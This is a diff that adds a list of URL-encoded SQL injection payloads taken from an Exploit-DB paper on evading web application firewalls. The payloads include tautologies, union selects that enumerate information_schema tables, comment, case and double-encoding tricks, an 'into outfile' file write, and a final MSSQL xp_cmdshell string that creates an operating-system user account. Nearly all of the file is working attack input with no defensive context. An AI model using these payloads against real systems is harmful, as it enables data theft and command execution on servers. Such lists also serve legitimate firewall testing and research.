@@ -1,0 +1,40 @@
+# http://www.exploit-db.com/papers/17934/
+# A few typos corrected
+
+1+or+1+%3D+1
+1+%7C%7C+1+%3D+1
+1+and+1+%3D+1
+1+%26%26+1+%3D+1
+1+%7C%7C+%28select+user+from+users+where+user_id+%3D+1%29+%3D+%27admin%27
+1+%7C%7C+%28select+user+from+users+where+user_id+%3D+1%29+%3D+%27admin%27
+1+%7C%7C+%28select+user+from+users+limit+1%29+%3D+%27admin%27
+1+%7C%7C+%28select+user+from+users+group+by+user_id+having+user_id+%3D+1%29+%3D+%27admin%27
+1+%7C%7C+%28select+substr%28group_concat%28user_id%29%2C1%2C1%29+user+from+users+%29+%3D+1
+1+%7C%7C+%28select+substr%28group_concat%28user_id%29%2C1%2C1%29+user+from+users%29+%3D+1
+1+%7C%7C+1+%3D+1+into+outfile+%27result.txt%27
+1+%7C%7C+substr%28user%2C1%2C1%29+%3D+%27a%27
+1+%7C%7C+%28select+substr%28group_concat%28user_id%29%2C1%2C1%29+user+from+users%29+%3D+1
+1+%7C%7C+user_id+is+not+null
+1+%7C%7C+substr%28user%2C1%2C1%29+%3D+0x61
+1+%7C%7C+substr%28user%2C1%2C1%29+%3D+unhex%2861%29
+1+%7C%7C+substr%28user%2C1%2C1%29+%3D+lower%28conv%2811%2C10%2C36%29%29
+1+%7C%7C+lpad%28user%2C7%2C1%29
+1%0b||%0blpad(user,7,1)
+1+union+select+1%2C+table_name+from+information_schema.tables+where+table_name+%3D+%27users%27
+1+union+select+1%2C+table_name+from+information_schema.tables+where+table_name+between+%27a%27+and+%27z%27
+1+union+select+1%2C+table_name+from+information_schema.tables+where+table_name+between+char%2897%29+and+char%28122%29
+1+union+select+1%2C+table_name+from+information_schema.tables+where+table_name+between+0x61+and+0x7a
+1+union+select+1%2C+table_name+from+information_schema.tables+where+table_name+like+0x7573657273
+1+UnIoN/**/SeLecT/**/1,2,3--
+# double url-encoded
+## 21%252f%252a*/union%252f%252a*/select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users--
+21%2f%2a*/union%2f%2a*/select%2f%2a*/1,2,3%2f%2a*/from%2f%2a*/users--
+1+/**/union/**/select
+1+/%2A%2A/union/%2A%2A/select
+1+%2f**%2funion%2f**%2fselect
+0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+0+div+1+union+select+1%2C2%2Ccurrent_user
+1+and+(select 1)=(select+0x414141414141441414141414114141414141414141414141414141414141414141.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--
+1/*!UnIoN*/SeLecT+1,2,3--
+=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables+*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--
+1%27%3B+%2F%2A%26id%3D1%2A%2F+EXEC+%2F%2A%26id%3D1%2A%2F+master..xp_cmdshell+%2F%2A%26id%3D1%2A%2F+net+user+lucifer+UrWaFisShiT+%2F%2A%26id%3D1%2A%2F+--
